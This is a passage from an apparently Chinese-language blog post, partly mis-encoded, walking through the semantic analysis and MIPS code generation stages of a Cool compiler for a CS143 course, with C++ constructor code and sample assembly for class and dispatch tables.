class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// The function which runs the semantic analyser.</span><br><span class="hljs-function">InheritanceNodeP <span class="hljs-title">program_class::semant</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-built_in">initialize_constants</span>();<br>   ClassTableP classtable = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ClassTable</span>(classes);<br>   <span class="hljs-keyword">if</span> (classtable-&gt;<span class="hljs-built_in">errors</span>()) &#123;<br>      cerr &lt;&lt; <span class="hljs-string">&quot;Compilation halted due to static semantic errors.&quot;</span> &lt;&lt; endl;<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>   &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å¯ä»¥æƒ³åˆ°åœ¨ClassTableçš„æ„é€ å‡½æ•°ä¸­å®Œæˆæ£€æŸ¥ASTæ ‘, å…¶ä¸­ä¸€ä¸ªæµç¨‹å¦‚ä¸‹:</p><p>This file implements the semantic checks for Cool.  There are three passes:</p><ul><li><strong>Pass 1</strong>: This is not a true pass, as only the classes are inspected. The inheritance graph is built and checked for errors.  There are two â€œsubâ€-passes: check that classes are not redefined and inherit only from defined classes, and check for <strong>cycles</strong> in the inheritance graph.  Compilation is halted if an error is detected between the sub-passes.<ul><li>  enterscope : æ–°å»ºä¸€ä¸ªtbl</li><li>  install_basic_classes : æ³¨æ„æœ‰ä¸‰ä¸ªä¸å¯ç»§æ‰¿çš„class(No_class SELF_TYPE prim_slot), å…·ä½“è§semant.cc</li><li>  install_classes : è£…è½½æ„é€ å‡½æ•°çš„å‚æ•°classes</li><li>  check_improper_inheritance : </li><li>  build_inheritance_tree</li><li>  root()-&gt;mark_reachable()</li><li>  check_for_cycles</li></ul></li><li><strong>Pass 2</strong>: Symbol tables are built for each class.  This step is done separately because methods and attributes have global scopeâ€”therefore, bindings for all methods and attributes must be known before type checking can be done.<ul><li>build_feature_tables : ç°åœ¨æœ‰äº†ç»§æ‰¿æ ‘, <ul><li>  é¦–å…ˆæ˜¯åˆå§‹åŒ–Objectçš„envå’Œbuild_feature_tables(), </li><li>  å†å‘envçš„meth_tableæˆ–var_tableåŠ å…¥è¯¥feature, è¿™ä¸ªè¿‡ç¨‹ä¸­é¡ºå¸¦æ£€æŸ¥ä¸€ä¸‹æ˜¯å¦é‡å¤å®šä¹‰, æ˜¯å¦é”™è¯¯é‡è½½(é’ˆå¯¹method), å½“å‰ç±»å’Œç¥–å…ˆç±»æ˜¯å¦é‡åå˜é‡(é’ˆå¯¹attr)</li><li>  ç„¶åcopy the parentâ€™s environment to childrenâ€™s env, ç»§ç»­é€’å½’è¿­ä»£.</li></ul></li><li>  check_main : è¿™ä¸ªæ˜¯æ£€æŸ¥main classå’Œmain methodæ˜¯å¦å­˜åœ¨ä»¥åŠmain methodå‚æ•°ä¸èƒ½ä¸º0.</li></ul></li><li><strong>Pass 3</strong>: The inheritance graphâ€”which is known to be a tree if there are no cyclesâ€”is traversed again, starting from the root class Object.  For each class, each attribute and method is <strong>typechecked</strong>.  Simultaneously, identifiers are checked for correct definition/use and for multiple definitions.  <strong>An invariant is maintained that all parents of a class are checked before a class is checked.</strong> <ul><li>  root()-&gt;type_check_features : æœ‰ä¸ªä¸œè¥¿æ˜¯typeçš„æ¯”è¾ƒ. methodæœ€åä¸€æ¡è¯­å¥çš„typeè¦&lt;=return_type. å…·ä½“è§kpåšå®¢å’Œä»£ç </li></ul></li></ul><p>ç›¸åº”çš„æ„é€ å‡½æ•°ä¸º:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">ClassTable::<span class="hljs-built_in">ClassTable</span>(Classes classes) : <span class="hljs-built_in">nds</span>(<span class="hljs-literal">NULL</span>), <br>                                          <span class="hljs-built_in">semant_errors</span>(<span class="hljs-number">0</span>),<br>                                          <span class="hljs-built_in">error_stream</span>(cerr)<br>&#123;<br>  <span class="hljs-built_in">enterscope</span>();             <span class="hljs-comment">// initially the symbol table is empty</span><br>  <span class="hljs-comment">// predefined basic classes, è¿™ä¸ªé¢„è®¾çš„å†™å¾—å·®ä¸å¤šäº†,ä¸è¿‡çœŸæ˜¯å¥—å¨ƒç»“æ„,ä¹Ÿè®¸å¯ä»¥æ›´ä¼˜é›…ä¸€ç‚¹.</span><br>  <span class="hljs-built_in">install_basic_classes</span>();  <br>  <span class="hljs-keyword">if</span> (semant_debug)  cerr &lt;&lt; <span class="hljs-string">&quot;Installed basic classes.&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-comment">//æœ€åç¨‹åºè¯­æ³•åˆ†æå‡ºæ¥çš„æœ€ä¸Šå±‚çš„ç±»å‹æ˜¯Program,ç”±classesç»„æˆ</span><br>  <span class="hljs-built_in">install_classes</span>(classes); <span class="hljs-comment">// user defined classes, attach it to the tail of symbolTableList</span><br>  <span class="hljs-keyword">if</span> (semant_debug) <br>    &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Installed user-defined classes&quot;</span> &lt;&lt; endl; <span class="hljs-built_in">dump</span>(); &#125;<br>  <span class="hljs-built_in">check_improper_inheritance</span>();  <span class="hljs-comment">// check for undefined class and `CantInherit` class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked for simple inheritance errors.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-comment">//é‡åˆ°ä¸Šé¢è¿™ç§fatal_errorçš„æ—¶å€™å°±ä¸èƒ½å¾€ä¸‹ç»§ç»­semantäº†ï¼Œ å¿…é¡»æŠ¥é”™å¹¶é€€å‡ºç¨‹åº</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">errors</span>()) <span class="hljs-keyword">return</span>;<br>                                              <br>  <span class="hljs-comment">//ç»è¿‡äº†install [basic] classeså’Œcheck-improper-inheritanceï¼Œ</span><br>  <span class="hljs-comment">//å¯ä»¥ä¿è¯æ‰€å»ºç«‹çš„ç»§æ‰¿æ ‘æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰valid parentï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨set_relations</span><br>  <span class="hljs-built_in">build_inheritance_tree</span>(); <span class="hljs-comment">// set class-nodes&#x27; parent and added to parent&#x27;s children list</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Built inheritance tree.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">mark_reachable</span>(); <span class="hljs-comment">// find all classes reachable from root class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Marked reachable classes.&quot;</span> &lt;&lt; endl; &#125;                                           <br>  <span class="hljs-comment">// This method should be run only after mark_reachable has executed.</span><br>  <span class="hljs-comment">// **If there are any unreachable classes in the inheritance graph and</span><br>  <span class="hljs-comment">// all of the local checks of check_improper_inheritance succeeded,</span><br>  <span class="hljs-comment">// then there is a cycle in the inheritance graph**.</span><br>  <span class="hljs-built_in">check_for_cycles</span>();       <br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked for cycles.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-comment">//é‡åˆ°cyclesçš„æ—¶å€™åŒç† å¿…é¡»æŠ¥é”™å¹¶é€€å‡ºç¨‹åº</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">errors</span>()) <span class="hljs-keyword">return</span>;<br>                                              <br>  <span class="hljs-comment">//é¦–å…ˆæ£€æŸ¥å®Œfeatureæ¯ä¸€é¡¹, ç„¶åå‘envçš„meth_tableæˆ–var_tableåŠ å…¥è¯¥feature</span><br>  <span class="hljs-comment">//ç„¶åcopy the parent&#x27;s environment to children&#x27;s env</span><br>  <span class="hljs-built_in">build_feature_tables</span>();   <span class="hljs-comment">// build symbol tables of features for each class</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Built feature tables.&quot;</span> &lt;&lt; endl; &#125;<br>  <span class="hljs-built_in">check_main</span>();             <span class="hljs-comment">// check for Main class and main method</span><br>  <span class="hljs-keyword">if</span> (semant_debug) &#123; cerr &lt;&lt; <span class="hljs-string">&quot;Checked Main class and method.&quot;</span> &lt;&lt; endl; &#125;<br>                                              <br>  <span class="hljs-comment">// type check all expressions, first root, then all the way down to its children</span><br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">type_check_features</span>(); <br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç„¶åå„ç§ç»†èŠ‚ç»†åˆ°éš¾ä»¥ç½®ä¿¡, éƒ½ä¸æ•¢æƒ³è±¡æˆ‘è‡ªå·±å†™åˆ°åº•è¦ç”¨æ‰å¤šå°‘æ—¶é—´</p><p>å†æ¬¡å›å¤´çœ‹æ„Ÿè§‰æ²¡æœ‰é‚£ä¹ˆå¤æ‚äº†. å¸Œæœ›åˆ°æ—¶ä¸­é—´ä»£ç ä¼˜åŒ–ä¹Ÿæ˜¯å¦‚æ­¤. </p><ul><li><h2 id="What-requirements-do-I-need-to-check"><a href="#What-requirements-do-I-need-to-check" class="headerlink" title="What requirements do I need to check?"></a>What requirements do I need to check?</h2></li><li><h2 id="When-do-I-need-to-check-a-requirement"><a href="#When-do-I-need-to-check-a-requirement" class="headerlink" title="When do I need to check a requirement?"></a>When do I need to check a requirement?</h2></li><li><h2 id="When-is-the-information-needed-to-check-a-requirement-generated"><a href="#When-is-the-information-needed-to-check-a-requirement-generated" class="headerlink" title="When is the information needed to check a requirement generated?"></a>When is the information needed to check a requirement generated?</h2></li><li><h2 id="Where-is-the-information-I-need-to-check-a-requirement"><a href="#Where-is-the-information-I-need-to-check-a-requirement" class="headerlink" title="Where is the information I need to check a requirement?"></a>Where is the information I need to check a requirement?</h2></li></ul><h2 id="4-codeGenerate-ä»£ç ç”Ÿæˆ"><a href="#4-codeGenerate-ä»£ç ç”Ÿæˆ" class="headerlink" title="4.codeGenerate - ä»£ç ç”Ÿæˆ"></a>4.codeGenerate - ä»£ç ç”Ÿæˆ</h2><p>è¿™éƒ¨åˆ†çš„ä»£ç æ›´é•¿äº†, è¯¶å¯çœŸç´¯, çœŸå®çš„è¦æ±‚å¯æ˜¯è‡ªå·±å†™.</p><ol><li>Determine and emit code for global constants, such as prototype objects.</li><li>Determine and emit code for global tables, such as the class nameTab, the class objTab, and the<br>dispatch tables.</li><li>Determine and emit code for the initialization method of each class.</li><li>Determine and emit code for each method definition</li></ol><p>æ‹œæ‹œäº†, çœ‹ç´¯äº†è·³è¿‡. </p><p>ä»£ç ç”Ÿæˆæ¡†æ¶:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">CgenClassTable::<span class="hljs-built_in">CgenClassTable</span>(Classes classes, ostream&amp; s) : <span class="hljs-built_in">nds</span>(<span class="hljs-literal">NULL</span>) , <span class="hljs-built_in">str</span>(s)<br>&#123;<br>   <span class="hljs-comment">//stringclasstag = 0 /* Change to your String class tag here */;</span><br>   <span class="hljs-comment">//intclasstag =    0 /* Change to your Int class tag here */;</span><br>   <span class="hljs-comment">//boolclasstag =   0 /* Change to your Bool class tag here */;</span><br><br>   <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;Building CgenClassTable&quot;</span> &lt;&lt; endl;<br>   num_classes = <span class="hljs-number">0</span>;<br>   <span class="hljs-comment">// make sure the various tables have a scope</span><br>   class_to_tag_table.<span class="hljs-built_in">enterscope</span>();<br>   class_to_max_child_tag_table.<span class="hljs-built_in">enterscope</span>();<br>   tag_to_class_table.<span class="hljs-built_in">enterscope</span>();<br>   table_of_method_tables.<span class="hljs-built_in">enterscope</span>();<br><br><br>   <span class="hljs-built_in">enterscope</span>();<span class="hljs-comment">//init a new Scope to ScopeList</span><br>   <span class="hljs-built_in">install_basic_classes</span>();<span class="hljs-comment">//the same as PA4</span><br>   <span class="hljs-built_in">install_classes</span>(classes);<br>    <br>   <span class="hljs-built_in">build_inheritance_tree</span>();<span class="hljs-comment">//building complete</span><br><br>   <span class="hljs-comment">// é€’å½’ï¼Œå°†æ¯ä¸ªCgenNodeçš„attr/methodæ•°æ®</span><br>   <span class="hljs-comment">// éƒ½å¡«å…¥CgenNodeå’ŒCgenClassTableä¸­çš„tableä¸­</span><br>   <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">init</span>(<span class="hljs-number">0</span><span class="hljs-comment">//root() returns CgenNode class</span><br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;Symbol,<span class="hljs-keyword">int</span>&gt;)<br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;<span class="hljs-keyword">int</span>,MethodBinding&gt;)<br>               ,<span class="hljs-number">0</span><br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;Symbol,VarBinding&gt;)<br>               ,*(<span class="hljs-keyword">new</span> SymbolTable&lt;<span class="hljs-keyword">int</span>,Entry&gt;));<br>   <span class="hljs-comment">// ç”Ÿæˆä»£ç </span><br>   <span class="hljs-built_in">code</span>();<br>   <span class="hljs-built_in">exitscope</span>();<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>åœ¨ç”Ÿæˆç›®æ ‡ä»£ç å‰ï¼Œéœ€è¦å…ˆè¯»å…¥<strong>AST</strong>çš„ç›¸å…³ä¿¡æ¯ï¼Œ**é‡å»ºç»§æ‰¿å›¾<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="å› ä¸ºæ­¤æ—¶å·²ç»é€šè¿‡äº†semant, å¯ä»¥ç¡®å®šASTæ˜¯æ­£ç¡®çš„ä»è€Œæ— éœ€æ£€æŸ¥">[1]</span></a></sup><strong>ï¼Œå¹¶è‡ªä¸Šè€Œä¸‹çš„åˆå§‹åŒ–ç›¸å…³çš„æ˜ å°„è¡¨æ ¼<br>åœ¨è¯¥åˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸ªç±»ä¼šéå†å…¶ä¸­çš„<code>feature</code>ï¼Œå¹¶å°†å…¶ç›¸å…³ä¿¡æ¯æ·»åŠ è‡³å¯¹åº”çš„<code>SymbolTable</code>ä¸­<br>å¦‚æœè¯¥<code>feature</code>æ˜¯<code>method</code>ï¼Œåˆ™è¿˜ä¼šé¢å¤–è‡ªé¡¶å‘ä¸‹è®¡ç®—æ‰€éœ€è¦çš„</strong>æœ€å°ä¸´æ—¶å˜é‡æ•°é‡<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="Stanford-cs143-pdfä¸­æåˆ°çš„">[2]</span></a></sup>**ï¼Œå¹¶å°†å…¶æ·»åŠ è¿›è¡¨æ ¼ä¸­ã€‚</li></ul><ul><li>init()çš„è¿‡ç¨‹:<ul><li>ä»å½¢å‚ä¸­å¾—åˆ°è¯¥classåˆå§‹featureä¸ªæ•°</li><li>assign_tag</li><li>å„ç§enterscope</li><li>è£…è½½features, ç”¨åˆ°äº†layout_featues:<ul><li>layout_method():</li><li>layout_attr():</li></ul></li><li>å„ç§mapçš„èµ‹å€¼</li></ul></li><li>code()çš„è¿‡ç¨‹:</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CgenClassTable::code</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding global data&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_global_data</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;choosing gc&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_select_gc</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding constants&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_constants</span>();<br><br><span class="hljs-comment">//                 Add your code to emit</span><br><span class="hljs-comment">//                   - prototype objects</span><br><span class="hljs-comment">//                   - class_nameTab</span><br><span class="hljs-comment">//                   - dispatch tables</span><br><span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding class table&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_class_table</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding object table&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_object_table</span>();<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding dispatch tables&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_dispatch_table</span>(str);<span class="hljs-comment">//recursively</span><br><br>  <span class="hljs-comment">// </span><br>  <span class="hljs-comment">// Check that strings required to code the prototype objects are installed.</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-built_in">assert</span>(inttable.<span class="hljs-built_in">lookup_string</span>(<span class="hljs-string">&quot;0&quot;</span>));<br>  <span class="hljs-built_in">assert</span>(stringtable.<span class="hljs-built_in">lookup_string</span>(<span class="hljs-string">&quot;&quot;</span>));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(INTNAME));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(STRINGNAME));<br>  <span class="hljs-built_in">assert</span>(idtable.<span class="hljs-built_in">lookup_string</span>(BOOLNAME));<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding prototypes&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_prototype_object</span>(str);<br><br>  <span class="hljs-comment">// /*##*/</span><br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cout &lt;&lt; <span class="hljs-string">&quot;coding global text&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">code_global_text</span>();<br><br><span class="hljs-comment">//                 Add your code to emit</span><br><span class="hljs-comment">//                   - object initializer</span><br><span class="hljs-comment">//                   - the class methods</span><br><span class="hljs-comment">//                   - etc...</span><br>  CgenEnvTopLevelP env = <span class="hljs-keyword">new</span> <span class="hljs-built_in">CgenEnvTopLevel</span>(&amp;class_to_tag_table,<br>     &amp;class_to_max_child_tag_table,<br>     &amp;table_of_method_tables,<br>     num_classes);<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding init methods&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_init</span>(str,env);<br><br>  <span class="hljs-keyword">if</span> (cgen_debug) cerr &lt;&lt; <span class="hljs-string">&quot;coding methods&quot;</span> &lt;&lt; endl;<br>  <span class="hljs-built_in">root</span>()-&gt;<span class="hljs-built_in">code_methods</span>(str,env);<br>&#125;<br></code></pre></div></td></tr></table></figure><p><a href="https://kiprey.github.io/2020/06/compiler-learning/#5-cgen-%E7%9B%AE%E6%A0%87%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90">ä»¥ä¸‹éƒ¨åˆ† å‡ºå¤„, æœªå…¨cv</a>:</p><ul><li><p>å£°æ˜å…¨å±€å˜é‡ã€‚ä¾‹å¦‚ä»¥ä¸‹mipsæ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .data<br>  .align  2<br>  .globl  class_nameTab<br>  .globl  Main_protObj<br>  .globl  Int_protObj<br>  .globl  String_protObj<br>  .globl  bool_const0<br>  .globl  bool_const1<br>  .globl  _int_tag<br>  .globl  _bool_tag<br>  .globl  _string_tag<br><br>_int_tag:<br>  .word 3<br>_bool_tag:<br>  .word 4<br>_string_tag:<br>  .word 5<br>  .globl _MemMgr_INITIALIZER<br></code></pre></div></td></tr></table></figure></li><li><p>å£°æ˜GCå™¨ã€‚ä¾‹å¦‚ä»¥ä¸‹æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">_MemMgr_INITIALIZER:<br>  .word _NoGC_Init<br>  .globl _MemMgr_COLLECTOR<br>_MemMgr_COLLECTOR:<br>  .word _NoGC_Collect<br>  .globl _MemMgr_TEST<br>_MemMgr_TEST:<br>  .word 0<br>  .word -1<br></code></pre></div></td></tr></table></figure></li><li><p>å°†å¸¸é‡è¾“å‡ºï¼ˆä¾‹å¦‚ï¼šæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”å¸¸é‡ï¼‰ï¼Œä¾‹å¦‚ä»¥ä¸‹éƒ¨åˆ†æ±‡ç¼–ä»£ç </p><blockquote><p>æ•°å­—å¸¸é‡åŒ…æ‹¬<code>0</code>ï¼Œå­—ç¬¦ä¸²å¸¸é‡åŒ…æ‹¬ç©ºå­—ç¬¦ä¸²<code>&quot;&quot;</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .word -1          # eye catcher for _gc_check<br>str_const8:             # è¯¥å­—ç¬¦ä¸²çš„æ ‡ç­¾<br>  .word 5               # string class tag<br>  .word 6               # size of the class(include 5,6,string_disptab,string and align)/word<br>  .word String_dispTab  # è¯¥ç±»å‹å¯ä»¥ä½¿ç”¨çš„æ–¹æ³•<br>  .word int_const2      # å­—ç¬¦ä¸²é•¿åº¦ï¼ˆå…¶ä¸­çš„int_const2æŒ‡å‘å¦ä¸€ä¸ªæ•°å­—å¸¸é‡ï¼‰<br>  .ascii &quot;Main&quot;         # å­—ç¬¦ä¸²çš„ASCIIç <br>  .byte 0               # å­—ç¬¦ä¸²æœ«å°¾çš„\0ç»ˆç»“ç¬¦<br>  .align 2              # å¯¹é½<br></code></pre></div></td></tr></table></figure></li><li><p>å°†æ‰€æœ‰ç±»çš„åç§°è¾“å‡ºã€‚ä¾‹å¦‚ä»¥ä¸‹æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">class_nameTab:        # è¿™ä¸€ä¸ªä¸ªçš„str_constéƒ½æŒ‡å‘ç‰¹å®šçš„å­—ç¬¦ä¸²<br>  .word str_const6    # str_const6  =&gt; &quot;Object&quot;<br>  .word str_const7    # str_const7  =&gt; &quot;IO&quot;<br>  .word str_const8    # str_const8  =&gt; &quot;Main&quot;<br>  .word str_const9    # str_const9  =&gt; &quot;Int&quot;<br>  .word str_const10   # str_const10 =&gt; &quot;Bool&quot;<br>  .word str_const11   # str_const11 =&gt; &quot;String&quot;<br></code></pre></div></td></tr></table></figure></li><li><p>å°†æ‰€æœ‰ç±»ä¸­çš„object tableè¾“å‡ºï¼ˆæœªçŸ¥ç”¨é€”ï¼Œåˆ é™¤åä»ç„¶å¯ä»¥æ‰§è¡Œï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">class_objTab:<br>  .word  Object_protObj<br>  .word  Object_init<br>  .word  IO_protObj<br>  .word  IO_init<br>  .word  Main_protObj<br>  .word  Main_init<br>  .word  Int_protObj<br>  .word  Int_init<br>  .word  Bool_protObj<br>  .word  Bool_init<br>  .word  String_protObj<br>  .word  String_init<br></code></pre></div></td></tr></table></figure></li><li><p>å°†æ¯ä¸ªç±»æ‰€å«çš„æ–¹æ³•è¾“å‡ºï¼ˆåŒ…æ‹¬è¯¥ç±»çš„ç»§æ‰¿ç±»ä¸­çš„æ–¹æ³•ï¼‰ï¼Œä¾‹å¦‚ä»¥ä¸‹æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">Main_dispTab:<br>  .word  Object.abort<br>  .word  Object.type_name<br>  .word  Object.copy<br>  .word  IO.out_string<br>  .word  IO.out_int<br>  .word  IO.in_string<br>  .word  IO.in_int<br>  .word  